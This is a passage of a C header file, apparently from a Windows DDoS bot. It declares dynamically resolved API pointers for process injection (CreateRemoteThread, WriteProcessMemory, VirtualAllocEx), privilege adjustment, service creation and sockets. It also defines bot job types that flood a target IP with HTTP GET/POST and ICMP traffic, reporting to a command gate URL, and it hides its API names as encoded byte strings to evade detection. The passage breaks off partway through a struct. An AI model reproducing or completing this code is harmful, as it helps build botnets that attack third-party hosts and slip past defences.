typedef HANDLE					(*IcmpCreateFilePtr)();
typedef DWORD					(*IcmpSendEchoPtr)(HANDLE IcmpHandle,IPAddr DestinationAddress,LPVOID RequestData,WORD RequestSize,PIP_OPTION_INFORMATION RequestOptions,LPVOID ReplyBuffer,DWORD ReplySize,DWORD Timeout);
typedef BOOL					(*IcmpCloseHandlePtr)(HANDLE  IcmpHandle);
typedef BOOL					( WINAPI *PGETMODULEINFORMATION)(  HANDLE hProcess,  HMODULE hModule,  LPMODULEINFO lpmodinfo,  DWORD cb);
typedef	HANDLE					( WINAPI *PCREATEFILEA)( LPCSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile);
typedef HANDLE					( WINAPI *PCREATEFILEW)( LPCWSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDisposition,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile);
typedef BOOL					( WINAPI *PCLOSEHANDLE )( HANDLE hObject );
typedef	HANDLE					( WINAPI *PCREATEFILE )( LPCTSTR lpFileName, DWORD dwDesiredAccess, DWORD dwShareMode, LPSECURITY_ATTRIBUTES lpSecurityAttributes, DWORD dwCreationDistribution, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile );
typedef HANDLE					( WINAPI *PCREATEMUTEX )( LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCTSTR lpName );
typedef BOOL					( WINAPI *PCREATEPIPE )( PHANDLE hReadPipe, PHANDLE hWritePipe, LPSECURITY_ATTRIBUTES lpPipeAttributes, DWORD nSize );
typedef BOOL					( WINAPI *PCREATEPROCESS )( LPCTSTR lpApplicationName, LPTSTR lpCommandLine, LPSECURITY_ATTRIBUTES lpProcessAttributes, LPSECURITY_ATTRIBUTES lpThreadAttributes, BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCTSTR lpCurrentDirectory, LPSTARTUPINFO lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation );
typedef BOOL					( WINAPI *PCOPYFILE )( LPCTSTR lpExistingFileName, LPCTSTR lpNewFileName, BOOL bFailIfExists );	
typedef BOOL					( WINAPI *PDELETEFILE )( LPCTSTR lpFileName );
typedef VOID					( WINAPI *PEXITPROCESS )( UINT uExitCode );	
typedef	BOOL					( WINAPI *PFREELIBRARY )( HMODULE hLibModule );
typedef	DWORD					( WINAPI *PGETCURRENTDIRECTORY )( DWORD nBufferLength, LPTSTR lpBuffer );
typedef HANDLE					( WINAPI *PGETCURRENTPROCESS )( VOID );
typedef BOOL					( WINAPI *PGETEXITCODEPROCESS )( HANDLE hProcess, LPDWORD lpExitCode );
typedef DWORD					( WINAPI *PGETFILEATTRIBUTES )( LPCTSTR lpFileName );
typedef DWORD					( WINAPI *PGETLASTERROR )( VOID );
typedef DWORD					( WINAPI *PGETMODULEFILENAME )( HMODULE hModule, PTSTR lpFilename, DWORD nSize );
typedef HMODULE					( WINAPI *PGETMODULEHANDLE )( LPCTSTR lpModuleName );
typedef	UINT					( WINAPI *PGETPRIVATEPROFILEINT )( LPCTSTR lpAppName, LPCTSTR lpKeyName, INT nDefault, LPCTSTR lpFileName );
typedef	DWORD					( WINAPI *PGETPRIVATEPROFILESTRING )( LPCTSTR lpAppName, LPCTSTR lpKeyName, LPCTSTR lpDefault, LPTSTR lpReturnedString, DWORD nSize, LPCTSTR lpFileName );
typedef	DWORD					( WINAPI *PGETPRIVATEPROFILESECTIONNAMES )( LPTSTR lpszReturnBuffer, DWORD nSize, LPCTSTR lpFileName );
typedef FARPROC					( WINAPI *PGETPROCADDRESS )( HMODULE hModule, LPCSTR lpProcName );
typedef VOID					( WINAPI *PGETSTARTUPINFO )( LPSTARTUPINFO lpStartupInfo );
typedef BOOL					( WINAPI *PGETVERSIONEX )( LPOSVERSIONINFO lpVersionInformation );
typedef UINT					( WINAPI *PGETWINDOWSDIRECTORY )( LPTSTR lpBuffer, UINT uSize );
typedef	HGLOBAL					( WINAPI *PGLOBALALLOC )( UINT uFlags, DWORD dwBytes );
typedef	HGLOBAL					( WINAPI *PGLOBALFREE )( HGLOBAL hMem );
typedef HINSTANCE				( WINAPI *PLOADLIBRARY )( LPCTSTR lpLibFileName );
typedef HANDLE					( WINAPI *POPENMUTEX )( DWORD dwDesiredAccess, BOOL bInheritHandle, LPCTSTR lpName );
typedef BOOL					( WINAPI *PPEEKNAMEDPIPE )( HANDLE hNamedPipe, LPVOID lpBuffer, DWORD nBufferSize, LPDWORD lpBytesRead, LPDWORD lpTotalBytesAvail, LPDWORD lpBytesLeftThisMessage );
typedef BOOL					( WINAPI *PREADFILE )( HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped );
typedef BOOL					( WINAPI *PSETFILEATTRIBUTES )( LPCTSTR lpFileName, DWORD dwFileAttributes );
typedef VOID					( WINAPI *PSLEEP )( DWORD dwMilliseconds );
typedef BOOL					( WINAPI *PWRITEFILE )( HANDLE hFile, LPCVOID lpBuffer, DWORD nNumberOfBytesToWrite, LPDWORD lpNumberOfBytesWritten, LPOVERLAPPED lpOverlapped );
typedef	BOOL					( WINAPI *PWRITEPRIVATEPROFILESECTION )( LPCTSTR lpAppName, LPCTSTR lpString, LPCTSTR lpFileName );
typedef	BOOL					( WINAPI *PWRITEPRIVATEPROFILESTRING )( LPCTSTR lpAppName, LPCTSTR lpKeyName, LPCTSTR lpString, LPCTSTR lpFileName );
typedef	HANDLE					( WINAPI *PCREATETHREAD )( LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId );
typedef	HANDLE					( WINAPI *PCREATETOOLHELP32SNAPSHOT )( DWORD dwFlags, DWORD th32ProcessID );
typedef	BOOL					( WINAPI *PGETCOMPUTERNAME )( LPTSTR lpBuffer, LPDWORD nSize );
typedef	UINT					( WINAPI *PGETDRIVETYPE )( LPCTSTR lpRootPathName );
typedef	BOOL					( WINAPI *PGETDISKFREESPACE )( LPCTSTR lpRootPathName, LPDWORD lpSectorsPerCluster, LPDWORD lpBytesPerSector, LPDWORD lpNumberOfFreeClusters, LPDWORD lpTotalNumberOfClusters );
typedef	int						( WINAPI *PGETLOCALEINFO )( LCID Locale, LCTYPE LCType, LPTSTR lpLCData, int cchData );
typedef	VOID					( WINAPI *PGETLOCALTIME )( LPSYSTEMTIME lpSystemTime );
typedef	UINT					( WINAPI *PGETSYSTEMDIRECTORY )( LPTSTR lpBuffer, UINT uSize );
typedef	VOID					( WINAPI *PGETSYSTEMTIME )( LPSYSTEMTIME lpSystemTime );
typedef	UINT					( WINAPI *PGETTEMPFILENAME )( LPCTSTR lpPathName, LPCTSTR lpPrefixString, UINT uUnique, LPTSTR lpTempFileName );
typedef	DWORD					( WINAPI *PGETTEMPPATH )( DWORD nBufferLength, LPTSTR lpBuffer);
typedef	int						( WINAPI *PGETTIMEFORMAT )( LCID Locale, DWORD dwFlags, CONST SYSTEMTIME *lpTime, LPCTSTR lpFormat, LPTSTR lpTimeStr, int cchTime );
typedef	BOOL					( WINAPI *PGETVOLUMEINFORMATION )( LPCTSTR lpRootPathName, LPTSTR lpVolumeNameBuffer, DWORD nVolumeNameSize, LPDWORD lpVolumeSerialNumber, LPDWORD lpMaximumComponentLength, LPDWORD lpFileSystemFlags, LPTSTR lpFileSystemNameBuffer, DWORD nFileSystemNameSize );
typedef	DWORD					( WINAPI *PGETLOGICALDRIVESTRINGS )( DWORD nBufferLength, LPTSTR lpBuffer );
typedef	VOID					( WINAPI *PGLOBALMEMORYSTATUS )( LPMEMORYSTATUS lpBuffer );
typedef	HANDLE					( WINAPI *POPENPROCESS )( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId );
typedef	BOOL					( WINAPI *PPROCESS32NEXT )( HANDLE hSnapshot, LPPROCESSENTRY32 lppe );
typedef	BOOL					( WINAPI *PPROCESS32FIRST )( HANDLE hSnapshot, LPPROCESSENTRY32 lppe );
typedef	BOOL					( WINAPI *PTERMINATEPROCESS )( HANDLE hProcess, UINT uExitCode );
typedef	DWORD 					( WINAPI *PSETFILEPOINTER )( HANDLE hFile, LONG lDistanceToMove, PLONG lpDistanceToMoveHigh, DWORD dwMoveMethod );
typedef	BOOL 					( WINAPI *PTERMINATETHREAD )( HANDLE hThread, DWORD dwExitCode );
typedef	BOOL 					( WINAPI *PMODULE32NEXT )( HANDLE hSnapshot, LPMODULEENTRY32 lpme );
typedef	BOOL 					( WINAPI *PMODULE32FIRST )( HANDLE hSnapshot, LPMODULEENTRY32 lpme );
typedef	BOOL 					( WINAPI *PFILETIMETOSYSTEMTIME )( CONST FILETIME *lpFileTime, LPSYSTEMTIME lpSystemTime );
typedef	BOOL 					( WINAPI *PGETPROCESSTIMES )( HANDLE hProcess, LPFILETIME lpCreationTime, LPFILETIME lpExitTime, LPFILETIME lpKernelTime, LPFILETIME lpUserTime );
typedef	BOOL 					( WINAPI *PGLOBALUNLOCK )( HGLOBAL hMem );
typedef	LPVOID 					( WINAPI *PGLOBALLOCK )( HGLOBAL hMem );
typedef	HANDLE					( WINAPI *PCREATEREMOTETHREAD )( HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, DWORD dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId );
typedef	VOID					( WINAPI *PEXITTHREAD )( DWORD dwExitCode );	
typedef	DWORD					( WINAPI *PGETCURRENTPROCESSID )( void );
typedef	DWORD					( WINAPI *PGETCURRENTTHREADID )( void );
typedef	DWORD					( WINAPI *PRESUMETHREAD )( HANDLE hThread );
typedef	DWORD					( WINAPI *PSUSPENDTHREAD )( HANDLE hThread );
typedef	LPVOID					( WINAPI *PVIRTUALALLOCEX )( HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD flAllocationType, DWORD flProtect );	
typedef	BOOL					( WINAPI *PVIRTUALFREEEX )( HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD dwFreeType );
typedef	DWORD					( WINAPI *PVIRTUALQUERYEX )( HANDLE hProcess, LPCVOID lpAddress, PMEMORY_BASIC_INFORMATION lpBuffer, DWORD dwLength );
typedef	BOOL					( WINAPI *PVIRTUALPROTECT )( LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect );
typedef	BOOL					( WINAPI *PVIRTUALPROTECTEX )( HANDLE hProcess, LPVOID lpAddress, DWORD dwSize, DWORD flNewProtect, PDWORD lpflOldProtect );
typedef	int						( WINAPI *PWIDECHARTOMULTIBYTE )( UINT CodePage, DWORD dwFlags, LPCWSTR lpWideCharStr, int cchWideChar, LPSTR lpMultiByteStr, int cchMultiByte, LPCSTR lpDefaultChar, LPBOOL lpUsedDefaultChar );
typedef	BOOL					( WINAPI *PWRITEPROCESSMEMORY )( HANDLE hProcess, LPVOID lpBaseAddress, LPVOID lpBuffer, DWORD nSize, LPDWORD lpNumberOfBytesWritten );
typedef	BOOL					( WINAPI *PTHREAD32FIRST )( HANDLE hSnapshot, LPTHREADENTRY32 lpte );
typedef	BOOL					( WINAPI *PTHREAD32NEXT )( HANDLE hSnapshot, LPTHREADENTRY32 lpte );
typedef HANDLE					( WINAPI *POPENTHREAD )( DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwThreadId );
// advapi32
typedef BOOL					( WINAPI *PADJUSTTOKENPRIVILEGES )( HANDLE TokenHandle, BOOL DisableAllPrivileges, PTOKEN_PRIVILEGES NewState, DWORD BufferLength, PTOKEN_PRIVILEGES PreviousState, PDWORD ReturnLength );
typedef BOOL					( WINAPI *PCLOSESERVICEHANDLE )( SC_HANDLE hSCObject );
typedef SC_HANDLE				( WINAPI *PCREATESERVICE )( SC_HANDLE hSCManager, LPCTSTR lpServiceName, LPCTSTR lpDisplayName, DWORD dwDesiredAccess, DWORD dwServiceType, DWORD dwStartType, DWORD dwErrorControl, LPCTSTR lpBinaryPathName, LPCTSTR lpLoadOrderGroup, LPDWORD lpdwTagId, LPCTSTR lpDependencies, LPCTSTR lpServiceStartName, LPCTSTR lpPassword );
typedef BOOL					( WINAPI *PGETSERVICEDISPLAYNAME )( SC_HANDLE hSCManager, LPCTSTR lpServiceName, LPTSTR lpDisplayName, LPDWORD lpcchBuffer );
typedef BOOL					( WINAPI *PGETUSERNAME )( LPTSTR lpBuffer, LPDWORD nSize );
typedef BOOL					( WINAPI *PLOOKUPPRIVILEGEVALUE )( LPCTSTR lpSystemName, LPCTSTR lpName, PLUID lpLuid );
typedef BOOL					( WINAPI *POPENPROCESSTOKEN )( HANDLE ProcessHandle, DWORD DesiredAccess, PHANDLE TokenHandle );
typedef SC_HANDLE				( WINAPI *POPENSCMANAGER )( LPCTSTR lpMachineName, LPCTSTR lpDatabaseName, DWORD dwDesiredAccess );
typedef SC_HANDLE				( WINAPI *POPENSERVICE )( SC_HANDLE hSCManager, LPCTSTR lpServiceName, DWORD dwDesiredAccess );
typedef SERVICE_STATUS_HANDLE	( WINAPI *PREGISTERSERVICECTRLHANDLER )( LPCTSTR lpServiceName, LPHANDLER_FUNCTION lpHandlerProc );
typedef LONG					( WINAPI *PREGCREATEKEY )( HKEY hKey, LPCTSTR lpSubKey, PHKEY phkResult );	
typedef LONG					( WINAPI *PREGCLOSEKEY )( HKEY hKey );	
typedef LONG					( WINAPI *PREGDELETEVALUE )( HKEY hKey, LPCTSTR lpValueName );
typedef LONG					( WINAPI *PREGOPENKEY )( HKEY hKey, LPCTSTR lpSubKey, PHKEY phkResult );
typedef LONG					( WINAPI *PREGQUERYVALUEEX )( HKEY hKey, LPTSTR lpValueName, LPDWORD lpReserved, LPDWORD lpType, LPBYTE lpData, LPDWORD lpcbData );	
typedef LONG					( WINAPI *PREGSETVALUEEX )( HKEY hKey, LPCTSTR lpValueName, DWORD Reserved, DWORD dwType, CONST BYTE *lpData, DWORD cbData );
typedef BOOL					( WINAPI *PSETSERVICESTATUS )( SERVICE_STATUS_HANDLE hServiceStatus, LPSERVICE_STATUS lpServiceStatus );	
typedef BOOL					( WINAPI *PSTARTSERVICE )( SC_HANDLE hService, DWORD dwNumServiceArgs, LPCTSTR *lpServiceArgVectors );
typedef BOOL					( WINAPI *PSTARTSERVICECTRLDISPATCHER )( LPSERVICE_TABLE_ENTRY lpServiceStartTable );
typedef BOOL 					( WINAPI *PENUMSERVICESSTATUS )( SC_HANDLE hSCManager, DWORD dwServiceType, DWORD dwServiceState, LPENUM_SERVICE_STATUS lpServices, DWORD cbBufSize, LPDWORD pcbBytesNeeded, LPDWORD lpServicesReturned, LPDWORD lpResumeHandle );
typedef BOOL 					( WINAPI *PCONTROLSERVICE )( SC_HANDLE hService, DWORD dwControl, LPSERVICE_STATUS lpServiceStatus );
typedef BOOL 					( WINAPI *PDELETESERVICE )( SC_HANDLE hService );
// ws2_32
typedef int						( WINAPI *PSELECT)(  int nfds,  fd_set* readfds,  fd_set* writefds,  fd_set* exceptfds,  const struct timeval* timeout);
typedef unsigned long			( WINAPI *PINETADDR)(  const char* cp);
typedef struct hostent* FAR		( WINAPI *PGETHOSTBYNAME)(  const char* name);
typedef int						( WINAPI *PWSAGETLASTERROR)(void);
typedef int						( WINAPI *PSHUTDOWN)(  SOCKET s,  int how);
typedef int						( WINAPI *P__WSAFDISSET)(  SOCKET fd,  fd_set* set);
typedef u_short					( WINAPI *PHTONS)(  u_short hostshort);
typedef int						( WINAPI *PCONNECT)(  SOCKET s,  const struct sockaddr* name,  int namelen);



typedef int						( PASCAL FAR *PWSACLEANUP )( void );
typedef int						( PASCAL FAR *PWSASTARTUP )( WORD wVersionRequired, LPWSADATA lpWSAData );
typedef SOCKET					( PASCAL FAR *PACCEPT )( SOCKET s, struct sockaddr FAR *addr, int FAR *addrlen );
typedef int						( PASCAL FAR *PBIND )( SOCKET s, const struct sockaddr FAR *addr, int namelen );
typedef int						( PASCAL FAR *PCLOSESOCKET )( SOCKET s );
typedef int						( PASCAL FAR *PIOCTLSOCKET )( SOCKET s, long cmd, u_long FAR *argp );
typedef int						( PASCAL FAR *PLISTEN )( SOCKET s, int backlog );
typedef int						( PASCAL FAR *PRECV )( SOCKET s, char FAR * buf, int len, int flags );
typedef int						( PASCAL FAR *PSEND )( SOCKET s, const char FAR * buf, int len, int flags );
typedef	SOCKET					( PASCAL FAR *PSOCKET )( int af, int type, int protocol );

// o Bot Options
#define BOT_ID_LEN				20		// bot ID lenght ( for admin panel )
#define JOB_STATUS_WORK			0xFFFF8881
#define JOB_STATUS_PAUSE		0xFFFF8882
#define JOB_STATUS_EXIT			0xFFFF8883
#define JOB_STATUS_IDLE			0xFFFF9994

#define JOB_TYPE_HTTP_GET		0xFFFF9991
#define JOB_TYPE_HTTP_POST		0xFFFF9992
#define JOB_TYPE_ICMP			0xFFFF9993
//===================================================================
typedef struct icmphdr{
	USHORT	i_cksum;
	USHORT	i_id;
	USHORT	i_seq;
	BYTE	i_type;
	BYTE	i_code;
	ULONG	timestamp;
} ICMP_HEADER; 
//===================================================================
typedef struct _BOT_JOB_HTTP {
	union {
		ULONG HostIp;
		struct in_addr addrTargetIp;
	};
	USHORT Port;
	CHAR Action[10];
	CHAR ActionParam[2048];
	CHAR Host[250];
}	BotJobHttp, *PBotJobHttp;
//===================================================================
typedef struct _BOT_JOB_ICMP {
	union {
		ULONG HostIp;
		IPAddr addrTargetIp;
	};
	ULONG PacketSize;
}	BotIcmpJob, *PBotIcmpJob;
//===================================================================
typedef struct _BOT_TASK { 
	PVOID pNextTask;
	PVOID pPrevTask;
	ULONG JobId;
	ULONG JobStatus;
	ULONG JobType;
	ULONG JobThreadId;
	PVOID Job;
	HANDLE JobThreadHandle;
	BOOLEAN bStop;
}	BotTask, *PBotTask;
//===================================================================
typedef struct _BOT_OPTIONS {
	char szBotId[BOT_ID_LEN];
	BOOL bStarted;
}	BotOptions,*PBotOptions;  
//===================================================================
typedef struct _GLOBAL_OPTIONS {
	ULONG dwSleepTime;
	ULONG IcmpSleepTime;
	ULONG HttpSleepTime;
	union {
		DWORD	dwGateIp;
		struct in_addr dwAddrGate;
	};
	char	szBotId[BOT_ID_LEN];
	char	szGateUrl[500];
	USHORT  Port;	
}	GLOBAL_OPTIONS,*PGLOBAL_OPTIONS;
//===================================================================
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
	PWCHAR Buffer;
} UNICODE_STRING;
//===================================================================
typedef struct _PEB_LDR_DATA
{
	ULONG      Length;
	ULONG      Initialized;
	PVOID      SsHandle;
	LIST_ENTRY InLoadOrderModuleList; 
	LIST_ENTRY InMemoryOrderModuleList;
	LIST_ENTRY InInitializationOrderModuleList;
	PVOID      EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
//===================================================================
typedef struct _LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     PVOID EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
//===================================================================
typedef struct _LDR_MODULE
{
	LIST_ENTRY		ModuleList;
	PVOID			BaseAddress;
	PVOID			EntryPoint;
	ULONG			SizeOfImage;
	UNICODE_STRING	FullDllName;
	UNICODE_STRING	BaseDllName;
	ULONG			Flags;
	SHORT			LoadCount; 
	SHORT			TlsIndex;
	LIST_ENTRY		HashTableEntry;
	ULONG			TimeDateStamp;
}	LDR_MODULE, *PLDR_MODULE;
//===================================================================
char *szApiNames[] = {
// =[ kernel32  ]============================
/* CreateFileA */				"\x98\xe9\x7e\x7a\xe7\x7e\x9d\x82\x7f\x7e\x9a",
/* CloseHandle */				"\x98\x7f\x84\xe8\x7e\x9b\x7a\x85\x77\x7f\x7e",
/* CopyFileA */					"\x98\x84\x83\xf2\x9d\x82\x7f\x7e\x9a",
/* CreatePipe */			 "\x98\xe9\x7e\x7a\xe7\x7e\xa3\x82\x83\x7e",
/* CreateProcessA */			 "\x98\xe9\x7e\x7a\xe7\x7e\xa3\xe9\x84\x78\x7e\xe8\xe8\x9a",
/* CreateRemoteThread */			 "\x98\xe9\x7e\x7a\xe7\x7e\x89\x7e\x86\x84\xe7\x7e\x87\x7b\xe9\x7e\x7a\x77",
/* CreateToolhelp32Snapshot */			 "\x98\xe9\x7e\x7a\xe7\x7e\x87\x84\x84\x7f\x7b\x7e\x7f\x83\xa8\xa9\x88\x85\x7a\x83\xe8\x7b\x84\xe7",
/* CreateThread */			 "\x98\xe9\x7e\x7a\xe7\x7e\x87\x7b\xe9\x7e\x7a\x77",
/* ExitProcess */			 "\x9e\xeb\x82\xe7\xa3\xe9\x84\x78\x7e\xe8\xe8",
/* ExitThread */			 "\x9e\xeb\x82\xe7\x87\x7b\xe9\x7e\x7a\x77",
/* GetCurrentProcess */			 "\x9c\x7e\xe7\x98\xee\xe9\xe9\x7e\x85\xe7\xa3\xe9\x84\x78\x7e\xe8\xe8",
/* GetCurrentProcessId */			 "\x9c\x7e\xe7\x98\xee\xe9\xe9\x7e\x85\xe7\xa3\xe9\x84\x78\x7e\xe8\xe8\xa2\x77",
/* GetCurrentThreadId */			 "\x9c\x7e\xe7\x98\xee\xe9\xe9\x7e\x85\xe7\x87\x7b\xe9\x7e\x7a\x77\xa2\x77",
/* GetExitCodeProcess */			 "\x9c\x7e\xe7\x9e\xeb\x82\xe7\x98\x84\x77\x7e\xa3\xe9\x84\x78\x7e\xe8\xe8",
/* GetFileAttributesA */			 "\x9c\x7e\xe7\x9d\x82\x7f\x7e\x9a\xe7\xe7\xe9\x82\x79\xee\xe7\x7e\xe8\x9a",
/* GetLastError */			 "\x9c\x7e\xe7\x9f\x7a\xe8\xe7\x9e\xe9\xe9\x84\xe9",
/* GetModuleFileNameA */			 "\x9c\x7e\xe7\xa6\x84\x77\xee\x7f\x7e\x9d\x82\x7f\x7e\xa5\x7a\x86\x7e\x9a",
/* GetModuleHandleA */			 "\x9c\x7e\xe7\xa6\x84\x77\xee\x7f\x7e\x9b\x7a\x85\x77\x7f\x7e\x9a",
/* GetProcAddress */			 "\x9c\x7e\xe7\xa3\xe9\x84\x78\x9a\x77\x77\xe9\x7e\xe8\xe8",
/* GetStartupInfoA */			 "\x9c\x7e\xe7\x88\xe7\x7a\xe9\xe7\xee\x83\xa2\x85\x7d\x84\x9a",
/* GetVersionExA */			 "\x9c\x7e\xe7\x8d\x7e\xe9\xe8\x82\x84\x85\x9e\xeb\x9a",
/* GetWindowsDirectoryA */			 "\x9c\x7e\xe7\x8c\x82\x85\x77\x84\xec\xe8\x97\x82\xe9\x7e\x78\xe7\x84\xe9\xf2\x9a",
/* LoadLibraryA */			 "\x9f\x84\x7a\x77\x9f\x82\x79\xe9\x7a\xe9\xf2\x9a",
/* OpenProcess */			 "\xa4\x83\x7e\x85\xa3\xe9\x84\x78\x7e\xe8\xe8",
/* OpenThread */			 "\xa4\x83\x7e\x85\x87\x7b\xe9\x7e\x7a\x77",
/* PeekNamedPipe */			 "\xa3\x7e\x7e\x80\xa5\x7a\x86\x7e\x77\xa3\x82\x83\x7e",
/* Process32First */			 "\xa3\xe9\x84\x78\x7e\xe8\xe8\xa8\xa9\x9d\x82\xe9\xe8\xe7",
/* Process32Next */			 "\xa3\xe9\x84\x78\x7e\xe8\xe8\xa8\xa9\xa5\x7e\xeb\xe7",
/* ReadFile */			 "\x89\x7e\x7a\x77\x9d\x82\x7f\x7e",
/* ResumeThread */			 "\x89\x7e\xe8\xee\x86\x7e\x87\x7b\xe9\x7e\x7a\x77",
/* Sleep */			 "\x88\x7f\x7e\x7e\x83",
/* SuspendThread */			 "\x88\xee\xe8\x83\x7e\x85\x77\x87\x7b\xe9\x7e\x7a\x77",
/* TerminateProcess */			 "\x87\x7e\xe9\x86\x82\x85\x7a\xe7\x7e\xa3\xe9\x84\x78\x7e\xe8\xe8",
/* Thread32First */			 "\x87\x7b\xe9\x7e\x7a\x77\xa8\xa9\x9d\x82\xe9\xe8\xe7",
/* Thread32Next */			 "\x87\x7b\xe9\x7e\x7a\x77\xa8\xa9\xa5\x7e\xeb\xe7",
/* VirtualAllocEx */			 "\x8d\x82\xe9\xe7\xee\x7a\x7f\x9a\x7f\x7f\x84\x78\x9e\xeb",
/* VirtualFreeEx */			 "\x8d\x82\xe9\xe7\xee\x7a\x7f\x9d\xe9\x7e\x7e\x9e\xeb",
/* VirtualQueryEx */			 "\x8d\x82\xe9\xe7\xee\x7a\x7f\x8a\xee\x7e\xe9\xf2\x9e\xeb",
/* VirtualProtect */			 "\x8d\x82\xe9\xe7\xee\x7a\x7f\xa3\xe9\x84\xe7\x7e\x78\xe7",
/* VirtualProtectEx */			 "\x8d\x82\xe9\xe7\xee\x7a\x7f\xa3\xe9\x84\xe7\x7e\x78\xe7\x9e\xeb",
/* WideCharToMultiByte */			 "\x8c\x82\x77\x7e\x98\x7b\x7a\xe9\x87\x84\xa6\xee\x7f\xe7\x82\x99\xf2\xe7\x7e",
/* WriteFile */			 "\x8c\xe9\x82\xe7\x7e\x9d\x82\x7f\x7e",
/* WriteProcessMemory */			 "\x8c\xe9\x82\xe7\x7e\xa3\xe9\x84\x78\x7e\xe8\xe8\xa6\x7e\x86\x84\xe9\xf2",
	NULL,
// =" advapi32  ]============================
/* AdjustTokenPrivileges */			"\x9a\x77\x81\xee\xe8\xe7\x87\x84\x80\x7e\x85\xa3\xe9\x82\xed\x82\x7f\x7e\x7c\x7e\xe8",
/* LookupPrivilegeValueA */			"\x9f\x84\x84\x80\xee\x83\xa3\xe9\x82\xed\x82\x7f\x7e\x7c\x7e\x8d\x7a\x7f\xee\x7e\x9a",
/* OpenProcessToken */				"\xa4\x83\x7e\x85\xa3\xe9\x84\x78\x7e\xe8\xe8\x87\x84\x80\x7e\x85",
/* RegSetValueExA */				"\x89\x7e\x7c\x88\x7e\xe7\x8d\x7a\x7f\xee\x7e\x9e\xeb\x9a",
/* RegCreateKeyA */					"\x89\x7e\x7c\x98\xe9\x7e\x7a\xe7\x7e\xa0\x7e\xf2\x9a",
	NULL,
// =""   ws2_32  ]============================
/* WSACleanup */			 "\x8c\x88\x9a\x98\x7f\x7e\x7a\x85\xee\x83",
/* WSAStartup */			 "\x8c\x88\x9a\x88\xe7\x7a\xe9\xe7\xee\x83",
/* accept */			 "\x7a\x78\x78\x7e\x83\xe7",
/* bind */			 "\x79\x82\x85\x77",
/* closesocket */			 "\x78\x7f\x84\xe8\x7e\xe8\x84\x78\x80\x7e\xe7",
/* htons */			 "\x7b\xe7\x84\x85\xe8",
/* ioctlsocket */			 "\x82\x84\x78\xe7\x7f\xe8\x84\x78\x80\x7e\xe7",
/* listen */			 "\x7f\x82\xe8\xe7\x7e\x85",
/* recv */			 "\xe9\x7e\x78\xed",
/* send */			 "\xe8\x7e\x85\x77",
/* socket */			 "\xe8\x84\x78\x80\x7e\xe7",
/* select */			 "\xe8\x7e\x7f\x7e\x78\xe7",
/* inet_addr */			 "\x82\x85\x7e\xe7\x94\x7a\x77\x77\xe9",
/* gethostbyname */			 "\x7c\x7e\xe7\x7b\x84\xe8\xe7\x79\xf2\x85\x7a\x86\x7e",
/* WSAGetLastError */			 "\x8c\x88\x9a\x9c\x7e\xe7\x9f\x7a\xe8\xe7\x9e\xe9\xe9\x84\xe9",
/* shutdown */			 "\xe8\x7b\xee\xe7\x77\x84\xec\x85",
/* __WSAFDIsSet */			 "\x94\x94\x8c\x88\x9a\x9d\x97\xa2\xe8\x88\x7e\xe7",
/* connect  */                   "\x78\x84\x85\x85\x7e\x78\xe7",
	NULL
};

typedef struct _apis {
// =[ kernel32  ]============================
	PCREATEFILEA				pCreateFile;
	PCLOSEHANDLE				pCloseHandle;
	PCOPYFILE					pCopyFile;
	PCREATEPIPE					pCreatePipe;
	PCREATEPROCESS				pCreateProcess;
	PCREATEREMOTETHREAD			pCreateRemoteThread;
	PCREATETOOLHELP32SNAPSHOT	pCreateToolhelp32Snapshot;
	PCREATETHREAD				pCreateThread;
	PEXITPROCESS				pExitProcess;
	PEXITTHREAD					pExitThread;
	PGETCURRENTPROCESS			pGetCurrentProcess;
	PGETCURRENTPROCESSID		pGetCurrentProcessId;
	PGETCURRENTTHREADID			pGetCurrentThreadId;
	PGETEXITCODEPROCESS			pGetExitCodeProcess;
	PGETFILEATTRIBUTES			pGetFileAttributes;
	PGETLASTERROR				pGetLastError;
	PGETMODULEFILENAME			pGetModuleFileName;
	PGETMODULEHANDLE			pGetModuleHandle;
	PGETPROCADDRESS				pGetProcAddress;
	PGETSTARTUPINFO				pGetStartupInfo;
	PGETVERSIONEX				pGetVersionEx;
	PGETWINDOWSDIRECTORY		pGetWindowsDirectory;
	PLOADLIBRARY				pLoadLibrary;
	POPENPROCESS				pOpenProcess;
	POPENTHREAD					pOpenThread;
